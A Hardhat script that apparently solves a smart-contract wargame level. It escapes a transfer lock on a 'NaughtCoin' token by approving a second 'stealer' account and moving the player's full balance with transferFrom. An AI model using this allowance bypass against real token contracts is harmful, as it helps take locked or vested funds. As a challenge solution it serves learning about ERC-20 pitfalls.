const hre = require("hardhat");
const { ethers } = hre;

async function main() {
  const [player, stealer] = await ethers.getSigners();
  const naughtCoinInstanceAddr = "0x3E7EAcf53218C615db125C38eBBD54AddA8Ae9d1";
  const NaughtCoin = await ethers.getContractFactory("NaughtCoin");
  const coinInstance = await NaughtCoin.attach(naughtCoinInstanceAddr);
  const symbol = await coinInstance.symbol();

  const playerBalanceBefore = await coinInstance.balanceOf(player.address);
  const stealerBalanceBefore = await coinInstance.balanceOf(stealer.address);

  let allowance = await coinInstance.allowance(player.address, stealer.address);

  console.log("Player balance:", ethers.utils.formatEther(playerBalanceBefore), symbol);
  console.log("Stealer balance:", ethers.utils.formatEther(stealerBalanceBefore), symbol);

  console.log("Allowance to spender:", ethers.utils.formatEther(allowance), symbol);

  console.log("Approving spending...");
  await coinInstance.connect(player).approve(stealer.address, playerBalanceBefore);

  allowance = await coinInstance.allowance(player.address, stealer.address);
  console.log("Allowance to spender:", ethers.utils.formatEther(allowance), symbol);

  console.log("\nStealing....");
  await coinInstance.connect(stealer).transferFrom(player.address, stealer.address, allowance);

  const playerBalanceAfter = await coinInstance.balanceOf(player.address);
  const stealerBalanceAfter = await coinInstance.balanceOf(stealer.address);

  console.log("\nPlayer balance:", ethers.utils.formatEther(playerBalanceAfter), symbol);
  console.log("Stealer balance:", ethers.utils.formatEther(stealerBalanceAfter), symbol);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
